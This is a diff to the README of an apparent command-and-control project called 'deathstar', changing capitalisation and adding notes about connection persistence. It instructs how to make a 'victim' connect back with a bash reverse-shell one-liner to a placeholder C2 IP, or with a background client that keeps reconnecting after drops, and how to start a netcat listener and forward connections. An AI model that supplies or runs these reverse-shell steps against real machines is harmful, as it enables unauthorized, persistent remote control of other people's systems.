@@ -18,7 +18,7 @@ Build and understand C2 infrastructure.
 # Start C2
 `python3 deathstar-web.py`
 
-or 
+OR 
 
 `python3 deathstar-term.py`
 
@@ -29,11 +29,13 @@ or
 # Have Victim connect to C2 
 Linux / MacOS
 
+- This will drop the moment the C2 server 'drops'
 `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
 
-or
+OR
 
-`./stardestroyer.py`
+- This will continue to connect to the C2 server even after it 'drops'
+`./stardestroyer.py &`
 
 # Start your listener 
 `nc -nvlp 4444`
@@ -41,7 +43,7 @@ or
 # Forward the connection to another listener
 On the webpage, type the IP of the listening device, and then click forward.
 
-or
+OR
 
 On the terminal, list the connections.
 
